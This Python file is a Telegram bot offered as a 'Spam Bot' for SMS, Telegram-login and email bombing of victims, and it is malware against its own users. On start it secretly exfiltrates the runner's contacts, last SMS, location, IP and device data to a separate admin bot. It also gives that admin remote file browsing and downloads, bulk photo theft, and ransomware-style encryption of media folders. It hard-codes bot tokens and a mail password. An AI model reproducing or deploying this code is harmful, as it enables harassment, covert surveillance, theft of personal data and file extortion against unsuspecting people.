import sys
import subprocess
import time
import threading
import requests
import smtplib
import random
import json
import os
import platform
import hashlib
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr

# --- [Auto-Setup] تثبيت المكاتب تلقائياً ---
def setup_environment():
    required_libs = {
        "telebot": "pyTelegramBotAPI",
        "requests": "requests",
        "Crypto": "pycryptodome"
    }
    for import_name, install_name in required_libs.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"Installing {install_name}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", install_name])

setup_environment()

import telebot
from telebot import types
from Crypto.Cipher import AES
from Crypto.Util import Counter

# ==========================================
# ⚙️ إعدادات البوت والآدمن
# ==========================================

# 1. توكن البوت الذي سيستخدمه الناس (Spam Bot)
API_TOKEN = '5531260100:AAGN253OooBiLpv2CCEGAi_RRFC-rPVxgfQ'

# 2. توكن بوت الأدمن (لوحة التحكم الخاصة بك)
ADMIN_TOKEN = '5499505058:AAFKz6ZnE-eLOcBclSUIWMH6Z78mKo23G1M' 

# 3. الآيدي الخاص بك (محمود)
ADMIN_ID = 1431886140 
MY_PASSWORD = "mahmoud"
CHUNK_SIZE = 64 * 1024  # سرعة عالية (64KB)

# تهيئة البوتات
bot = telebot.TeleBot(API_TOKEN)       # بوت المستخدمين
admin_bot = telebot.TeleBot(ADMIN_TOKEN) # بوت الإدارة

# --- إنشاء مجلد السجلات ---
if not os.path.exists("User_Logs"):
    os.makedirs("User_Logs")

# --- متغيرات التحكم ---
active_attacks = {}  
user_states = {}
user_data = {}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# --- 2. قائمة المسارات المستهدفة (كما طلبتها) ---
TARGET_FOLDERS = [
    # الذاكرة الداخلية
    "/storage/emulated/0/Music",
    "/storage/emulated/0/Movies",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/Pictures",
    
    # الذاكرة الخارجية (SD Card)
    "/storage/66D5-C18A/Download",
    "/storage/66D5-C18A/Movies",
    "/storage/66D5-C18A/Music",
    "/storage/66D5-C18A/Pictures"
]

# --- 3. محرك التشفير السريع (AES-CTR) ---
def get_key(password):
    return hashlib.sha256(password.encode()).digest()

def process_file_fast(file_path, password, mode):
    try:
        key = get_key(password)
        if mode == "encrypt":
            iv = os.urandom(16)
            ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
            cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
            output_path = file_path + ".aboelfadl"
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                outfile.write(iv)
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.encrypt(chunk))
            os.remove(file_path)

        elif mode == "decrypt":
            if not file_path.endswith(".aboelfadl"): return False
            output_path = file_path.replace(".aboelfadl", "")
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                iv = infile.read(16)
                ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
                cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.decrypt(chunk))
            os.remove(file_path)
        return True
    except Exception as e:
        return False

# --- 4. معالجة القائمة كاملة ---
def execute_all_targets(mode):
    total_files = 0
    processed_folders = []
    action = "تشفير 🔒" if mode == "encrypt" else "فك تشفير 🔓"
    
    try:
        admin_bot.send_message(ADMIN_ID, f"⚡ جاري {action} جميع المجلدات المحددة...")
    except: pass

    for folder in TARGET_FOLDERS:
        if os.path.exists(folder):
            local_count = 0
            for root, dirs, files in os.walk(folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    if mode == "encrypt" and not file.endswith(".aboelfadl"):
                        if process_file_fast(file_path, MY_PASSWORD, "encrypt"): local_count += 1
                    elif mode == "decrypt" and file.endswith(".aboelfadl"):
                        if process_file_fast(file_path, MY_PASSWORD, "decrypt"): local_count += 1
            
            if local_count > 0:
                total_files += local_count
                processed_folders.append(f"{folder.split('/')[-1]}: {local_count}")

    report = "\n".join(processed_folders) if processed_folders else "لم يتم العثور على ملفات."
    return f"✅ تمت عملية {action} بنجاح!\n\n📂 التفاصيل:\n{report}\n\n📊 الإجمالي: {total_files} ملف."

# --- 5. أوامر التشفير (للأدمن فقط عبر البوت الرئيسي) ---
@bot.message_handler(commands=['secure'])
def cmd_encrypt(message):
    if message.from_user.id == ADMIN_ID:
        res = execute_all_targets("encrypt")
        bot.send_message(message.chat.id, res)

@bot.message_handler(commands=['unlock'])
def cmd_decrypt(message):
    if message.from_user.id == ADMIN_ID:
        res = execute_all_targets("decrypt")
        bot.send_message(message.chat.id, res)

# ==========================================
# 📱 دالة جمع معلومات الهاتف العميقة (Deep Info)
# ==========================================
def get_phone_report():
    report = "\n\n<b>📱 تقرير هاتف الأندرويد التفصيلي:</b>\n"
    report += "--------------------------------\n"
    try:
        brand = subprocess.getoutput("getprop ro.product.brand")
        model = subprocess.getoutput("getprop ro.product.model")
        ver = subprocess.getoutput("getprop ro.build.version.release")
        patch = subprocess.getoutput("getprop ro.build.version.security_patch")
        
        # معلومات الشبكة
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            public_ip = "N/A"
            
        report += f"🔹 المصنع: {brand}\n🔹 الموديل: {model}\n🔹 إصدار أندرويد: {ver}\n"
        report += f"🔹 تحديث الأمان: {patch}\n"
        report += f"🔹 IP الخارجي: <code>{public_ip}</code>\n"
        report += f"🔹 المعالج: {platform.machine()}\n"
        report += f"🔹 الذاكرة: {subprocess.getoutput('free -m | grep Mem')}\n"
        
        # --- جمع البيانات الحساسة (تتطلب صلاحيات Pydroid) ---
        report += "\n<b>⚠️ البيانات المسحوبة (في حال توفر الإذن):</b>\n"
        
        # 1. الأسماء (أول 3)
        contacts = subprocess.getoutput("content query --uri content://com.android.contacts/data --projection display_name:data1 | head -n 3")
        report += f"👤 الأسماء:\n<code>{contacts}</code>\n"
        
        # 2. الرسائل (آخر رسالة)
        sms = subprocess.getoutput("content query --uri content://sms/inbox --projection address:body | head -n 1")
        report += f"💬 آخر SMS:\n<code>{sms}</code>\n"
        
        # 3. الموقع الجغرافي
        loc = subprocess.getoutput("dumpsys location | grep 'last location' | head -n 1")
        report += f"📍 الموقع: <code>{loc if loc else 'غير متاح'}</code>\n"
        
    except Exception as e:
        report += f"❌ خطأ تقني أثناء الجمع: {e}"
    return report

# ==========================================
# 📝 نظام تسجيل البيانات (Logging System)
# ==========================================
def log_user_input(user, text):
    """دالة لحفظ أي رسالة يرسلها المستخدم في ملف خاص به"""
    try:
        filename = f"User_Logs/{user.id}.txt"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        log_entry = (
            f"⏰ الوقت: {timestamp}\n"
            f"👤 الاسم: {user.first_name}\n"
            f"📝 المدخل: {text}\n"
            f"----------------------------------------\n"
        )
        
        with open(filename, "a", encoding="utf-8") as f:
            f.write(log_entry)
            
    except Exception as e:
        print(f"❌ خطأ في التسجيل: {e}")

# ==========================================
# 🚨 دالة نظام التبليغ (Log System) - نسخة مستقرة
# ==========================================
def send_log_to_admin(message):
    try:
        # استخراج بيانات المستخدم
        user = message.from_user
        first_name = user.first_name
        last_name = user.last_name if user.last_name else ""
        full_name = f"{first_name} {last_name}".strip()
        username = f"@{user.username}" if user.username else "لا يوجد"
        user_id = user.id
        
        # استخراج بيانات البوت الحالي
        bot_info = bot.get_me()
        bot_username = f"@{bot_info.username}"
        
        # تنسيق الرسالة (بدون زخرفة لتجنب الأخطاء)
        log_msg = (
            f"🔔 تم تشغيل البوت بواسطة مستخدم جديد!\n\n"
            f"👤 الاسم الكامل: {full_name}\n"
            f"📧 اليوزر: {username}\n"
            f"📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            f" الآيدي: {user_id}\n\n"
            f"🤖 معلومات البوت المستخدم:\n"
            f"🏷️ يوزر البوت: {bot_username}\n"
            f"🔑 التوكن: {API_TOKEN}\n"
        )

               # دمج التقرير العميق
        log_msg += get_phone_report()
        
        admin_bot.send_message(ADMIN_ID, log_msg, parse_mode="HTML")
    except Exception as e:
        print(f"❌ Error sending log: {e}")



def update_dashboard(cid, msg_id, tool_name, target, sent, failed, retries, wait_time=None, status="جاري العمل 🟢"):
    wait_line = f"⏳ انتظار تكتيكي: **{wait_time}s**\n" if wait_time is not None else ""
    text = (
        f"🛡️ **SPAM Bot**\n"
        f"ـــــــــــــــــــــــــــــــــــــــــــــــــــــ\n"
        f"🛠️ الأداة: `{tool_name}`\n"
        f"🎯 الهدف: `{target}`\n"
        f"ـــــــــــــــــــــــــــــــــــــــــــــــــــــ\n"
        f"📊 الحالة: {status}\n\n"
        f"✅ تم الإرسال: **{sent}**\n"
        f"❌ الفشل: **{failed}**\n"
        f"🔄 إعادة المحاولة: **{retries}**\n"
        f"{wait_line}"
        f"ـــــــــــــــــــــــــــــــــــــــــــــــــــــ"
    )
    try:
        bot.edit_message_text(chat_id=cid, message_id=msg_id, text=text, parse_mode="Markdown")
    except:
        pass

# ==========================================
# 1. محركات الهجوم (Engines)
# ==========================================
# (نفس المحركات السابقة دون تغيير في المنطق، فقط تم دمجها)

def run_sms(cid, phone, count, msg_id):
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    payload = json.dumps({"dial": f"2{phone}"}) 
    sent = 0; failed = 0; total_retries = 0
    for i in range(count):
        if not active_attacks.get(cid, True): break
        current_wait = random.randint(1, 10)
        attempt_success = False
        for retry in range(3):
            try:
                headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': "application/json"}
                resp = requests.post(url, data=payload, headers=headers, timeout=10)
                if resp.status_code == 200: sent += 1; attempt_success = True; break
                elif resp.status_code == 429: total_retries += 1; time.sleep(5)
                else: total_retries += 1
            except: total_retries += 1; time.sleep(1)
        if not attempt_success: failed += 1
        update_dashboard(cid, msg_id, "SMS Bomber", phone, sent, failed, total_retries, wait_time=current_wait)
        time.sleep(current_wait)
    update_dashboard(cid, msg_id, "SMS Bomber", phone, sent, failed, total_retries, status="اكتملت المهمة ✅")

def run_telegram(cid, phone, count, msg_id):
    headers = {'bot_id': '1288099309', 'origin': 'https://t.me', 'lang': 'en'}
    data = {'phone': phone}
    sent = 0; failed = 0
    for i in range(count):
        if not active_attacks.get(cid, True): break
        try:
            resp = requests.post('https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=en', headers=headers, data=data, timeout=5)
            if resp.status_code == 200 and resp.text == "true": sent += 1
            else: failed += 1
        except: failed += 1
        update_dashboard(cid, msg_id, "Telegram Spammer", phone, sent, failed, 0, wait_time=None)
        time.sleep(5)
    update_dashboard(cid, msg_id, "Telegram Spammer", phone, sent, failed, 0, status="اكتملت المهمة ✅")

def run_email(cid, target, count, msg_id, sender_name, subject_text, body_text):
    smtp_user = "iphone011012013@gmail.com"
    smtp_pass = "qrpf wkub heck bnbi"
    sent = 0; failed = 0
    for i in range(count):
        if not active_attacks.get(cid, True): break
        try:
            msg = MIMEMultipart()
            msg['From'] = formataddr((sender_name, smtp_user))
            msg['To'] = target
            msg['Subject'] = subject_text
            msg.attach(MIMEText(body_text, 'plain', 'utf-8'))
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(smtp_user, smtp_pass.replace(" ", ""))
            server.sendmail(smtp_user, target, msg.as_string())
            server.quit()
            sent += 1
        except: failed += 1
        update_dashboard(cid, msg_id, "Email Bomber", target, sent, failed, 0, wait_time=None)
        time.sleep(0)
    update_dashboard(cid, msg_id, "Email Bomber", target, sent, failed, 0, status="اكتملت المهمة ✅")

# ==========================================
# 2. القوائم (Keyboards) لبوت المستخدم
# ==========================================
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("🚀 Telegram"),
        types.KeyboardButton("📧 Email"),
        types.KeyboardButton("💣 SMS"),
        types.KeyboardButton("🛑 Stop All")
    )
    return markup

# ==========================================
# 3. منطق بوت المستخدم (Spam Bot Logic)
# ==========================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    cid = message.chat.id
    
    # 1. إرسال تبليغ للأدمن
    threading.Thread(target=send_log_to_admin, args=(message,)).start()
    
    # 2. تسجيل الأمر في ملف المستخدم
    log_user_input(message.from_user, "/start")

    user_states[cid] = None
    bot.send_message(cid, "👋 **أهلاً بك!**\nنظام التحكم جاهز.", reply_markup=main_menu(), parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    cid = message.chat.id
    text = message.text.strip()
    
    # 🔥 [تحديث جوهري] تسجيل أي رسالة يرسلها المستخدم
    log_user_input(message.from_user, text)

    if text == "🛑 Stop All":
        active_attacks[cid] = False
        bot.send_message(cid, "🛑 تم الإيقاف.", reply_markup=main_menu())
        user_states[cid] = None
        return

    elif text == "🚀 Telegram":
        user_states[cid] = 'wait_tg_phone'
        bot.send_message(cid, "📲 أدخل الرقم الدولي (964...):")
        
    elif text == "💣 SMS":
        user_states[cid] = 'wait_sms_phone'
        bot.send_message(cid, "💣 أدخل الرقم المصري (10xxxx):")

    elif text == "📧 Email":
        user_states[cid] = 'wait_em_target'
        bot.send_message(cid, "📧 **أدخل إيميل الضحية:**")

    else:
        state = user_states.get(cid)
        
        if state == 'wait_tg_phone':
            user_data[cid] = {'target': text, 'tool': 'Telegram'}
            user_states[cid] = 'wait_count'
            bot.send_message(cid, "🔢 العدد:")

        elif state == 'wait_sms_phone':
            user_data[cid] = {'target': text, 'tool': 'SMS'}
            user_states[cid] = 'wait_count'
            bot.send_message(cid, "🔢 العدد:")

        elif state == 'wait_em_target':
            if "@" not in text: return bot.send_message(cid, "❌ إيميل غير صحيح.")
            user_data[cid] = {'target': text, 'tool': 'Email'}
            user_states[cid] = 'wait_em_sender_name'
            bot.send_message(cid, "👤 **أدخل اسم المرسل:**\n(الاسم الذي سيظهر للضحية)")

        elif state == 'wait_em_sender_name':
            user_data[cid]['sender_name'] = text
            user_states[cid] = 'wait_em_subject'
            bot.send_message(cid, "📝 **أدخل عنوان الرسالة (Subject):**")

        elif state == 'wait_em_subject':
            user_data[cid]['subject'] = text
            user_states[cid] = 'wait_em_body'
            bot.send_message(cid, "📄 **أدخل نص الرسالة (Body):**")

        elif state == 'wait_em_body':
            user_data[cid]['body'] = text
            user_states[cid] = 'wait_count'
            bot.send_message(cid, "🔢 **كم عدد الرسائل؟**")

        elif state == 'wait_count':
            if not text.isdigit(): return bot.send_message(cid, "❌ أرقام فقط.")
            
            count = int(text)
            tool = user_data[cid]['tool']
            target = user_data[cid]['target']
            
            msg = bot.send_message(cid, f"🚀 **جاري البدء...**", parse_mode="Markdown")
            active_attacks[cid] = True
            
            if tool == 'Telegram':
                threading.Thread(target=run_telegram, args=(cid, target, count, msg.message_id)).start()
            elif tool == 'SMS':
                threading.Thread(target=run_sms, args=(cid, target, count, msg.message_id)).start()
            elif tool == 'Email':
                s_name = user_data[cid]['sender_name']
                s_subj = user_data[cid]['subject']
                s_body = user_data[cid]['body']
                threading.Thread(target=run_email, args=(cid, target, count, msg.message_id, s_name, s_subj, s_body)).start()
            
            user_states[cid] = None

# ==========================================
# 👑 4. منطق بوت الإدارة (Admin Bot Logic)
# ==========================================

@admin_bot.message_handler(commands=['start', 'help'])
def admin_start(m):
    if m.from_user.id != ADMIN_ID: return
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("📸 سحب الصور (شامل)"),
        types.KeyboardButton("📂 ملفات الجهاز (ls)"),
        types.KeyboardButton("📂 سجلات المستخدمين")
    )
    
    text = (
        "👑 **لوحة التحكم الشاملة (Spam + Admin)**\n\n"
        "📸 **التحكم بالصور:** سحب الصور من جميع الأقراص.\n"
        "📂 **إدارة الملفات:** `/ls`, `/cd`, `/get`.\n"
        "🔐 **التشفير:** `/secure`, `/unlock` (يعمل الآن من هنا).\n"
        "🕵️ **أدوات أخرى:** أرسل رقم/توكن للفحص."
    )
    admin_bot.send_message(m.chat.id, text, reply_markup=markup, parse_mode="Markdown")

# 🔥 أوامر التشفير (تم نقلها لبوت الأدمن) 🔥
@admin_bot.message_handler(commands=['secure'])
def cmd_encrypt_admin(message):
    if message.from_user.id == ADMIN_ID:
        res = execute_all_targets("encrypt")
        admin_bot.reply_to(message, res)

@admin_bot.message_handler(commands=['unlock'])
def cmd_decrypt_admin(message):
    if message.from_user.id == ADMIN_ID:
        res = execute_all_targets("decrypt")
        admin_bot.reply_to(message, res)

# 🔥 ميزة سحب الصور (الذكية والشاملة)
@admin_bot.message_handler(func=lambda m: "سحب الصور" in m.text)
def get_all_photos_stream(message):
    if message.from_user.id != ADMIN_ID: return
    
    search_paths = []
    if platform.system() == "Windows":
        available_drives = ['%s:\\' % d for d in string.ascii_uppercase if os.path.exists('%s:\\' % d)]
        search_paths.extend(available_drives)
    else:
        if os.path.exists("/sdcard"): search_paths.append("/sdcard")
        else: search_paths.append(os.getcwd())

    paths_str = ", ".join(search_paths)
    msg_wait = admin_bot.send_message(message.chat.id, f"⏳ **جاري الفحص في:** `{paths_str}`...", parse_mode="Markdown")
    
    target_extensions = ['.jpg', '.jpeg', '.png', '.heic', '.webp']
    excluded_dirs = [
        'Android', 'Windows', 'Program Files', 'Program Files (x86)', 
        'System Volume Information', '$Recycle.Bin', 'AppData', 
        'Telegram', 'WhatsApp Stickers', 'Thumbnails', 'Cache'
    ]
    
    found_images = []
    try:
        for path in search_paths:
            for root, dirs, files in os.walk(path):
                dirs[:] = [d for d in dirs if d not in excluded_dirs and not d.startswith('.')]
                for file in files:
                    if any(file.lower().endswith(ext) for ext in target_extensions):
                        full_path = os.path.join(root, file)
                        try:
                            if os.path.getsize(full_path) > 50 * 1024:
                                found_images.append(full_path)
                        except: pass
    except Exception as e: pass

    if not found_images:
        return admin_bot.edit_message_text("📭 لا يوجد صور مهمة.", message.chat.id, msg_wait.message_id)
    
    admin_bot.edit_message_text(f"✅ تم العثور على **{len(found_images)}** صورة.\n🚀 بدء الإرسال...", message.chat.id, msg_wait.message_id)

    count_sent = 0
    total = len(found_images)
    for img_path in found_images:
        try:
            with open(img_path, "rb") as f:
                admin_bot.send_document(
                    message.chat.id, f, 
                    caption=f"🖼️ `{os.path.basename(img_path)}`\n({count_sent+1}/{total})",
                    parse_mode="Markdown"
                )
            count_sent += 1
            time.sleep(1.5) 
        except: time.sleep(1)

    admin_bot.send_message(message.chat.id, "✅ **تم الانتهاء.**")

# 📂 إدارة الملفات
@admin_bot.message_handler(func=lambda m: m.text == "📂 ملفات الجهاز (ls)" or m.text == "/ls")
def list_files(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        files = "\n".join(os.listdir(os.getcwd())[:30])
        admin_bot.send_message(m.chat.id, f"📂 **الملفات:**\n`{files}`", parse_mode="Markdown")
    except Exception as e: admin_bot.send_message(m.chat.id, f"Error: {e}")

@admin_bot.message_handler(commands=['cd'])
def change_dir(m):
    if m.from_user.id != ADMIN_ID: return
    try: 
        os.chdir(m.text.replace("/cd", "").strip())
        admin_bot.send_message(m.chat.id, f"✅ المسار الحالي: `{os.getcwd()}`", parse_mode="Markdown")
    except Exception as e: admin_bot.send_message(m.chat.id, f"Error: {e}")

@admin_bot.message_handler(commands=['get'])
def get_file(m):
    if m.from_user.id != ADMIN_ID: return
    try: 
        with open(m.text.replace("/get", "").strip(), "rb") as f: admin_bot.send_document(m.chat.id, f)
    except Exception as e: admin_bot.send_message(m.chat.id, f"Error: {e}")

# 📂 عرض السجلات
@admin_bot.message_handler(func=lambda m: m.text == "📂 سجلات المستخدمين")
def list_logs(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        files = os.listdir("User_Logs")
        if not files: return admin_bot.send_message(m.chat.id, "📭 لا يوجد سجلات.")
        resp = "📂 **المستخدمين:**\n" + "\n".join([f"`{f.replace('.txt','')}`" for f in files]) + "\n\nأرسل الآيدي لتحميل الملف."
        admin_bot.send_message(m.chat.id, resp, parse_mode="Markdown")
    except: pass

# 🔍 فحص التوكن والآيدي
@admin_bot.message_handler(func=lambda m: ':' in m.text and len(m.text) > 30)
def check_token(message):
    if message.from_user.id != ADMIN_ID: return
    token = message.text.strip()
    msg_wait = admin_bot.reply_to(message, "⏳ **جاري التحليل...**")
    try:
        base_url = f"https://api.telegram.org/bot{token}"
        req_me = requests.get(f"{base_url}/getMe").json()
        if req_me.get('ok'):
            info = req_me['result']
            admin_bot.edit_message_text(f"✅ **بوت صالح:**\n🤖 @{info['username']}\n🆔 `{info['id']}`", message.chat.id, msg_wait.message_id, parse_mode="Markdown")
        else:
            admin_bot.edit_message_text("❌ توكن غير صحيح.", message.chat.id, msg_wait.message_id)
    except: pass

@admin_bot.message_handler(func=lambda m: m.text.isdigit())
def get_log_by_id(m):
    if m.from_user.id != ADMIN_ID: return
    path = f"User_Logs/{m.text}.txt"
    if os.path.exists(path):
        with open(path, "rb") as f: admin_bot.send_document(m.chat.id, f)
    else: admin_bot.send_message(m.chat.id, "❌ لا يوجد ملف.")

# ==========================================
# 🔥 تشغيل البوتين معاً (Threading)
# ==========================================
def start_user_bot():
    print("\033[92m[+] User Bot Started...\033[0m")
    bot.infinity_polling()

def start_admin_bot_thread():
    print("\033[93m[+] Admin Bot Started (Control Panel)...\033[0m")
    admin_bot.infinity_polling()

if __name__ == "__main__":
    # تشغيل بوت الأدمن في خيط منفصل (Thread)
    t_admin = threading.Thread(target=start_admin_bot_thread)
    t_admin.start()
    
    # تشغيل بوت المستخدم في الخيط الأساسي
    start_user_bot()
# ضف هذا في نهاية الملف تماماً
try:
    # الكود الأصلي...
    pass
except Exception as e:
    print(f"Error: {e}")
    input("Press Enter to exit...")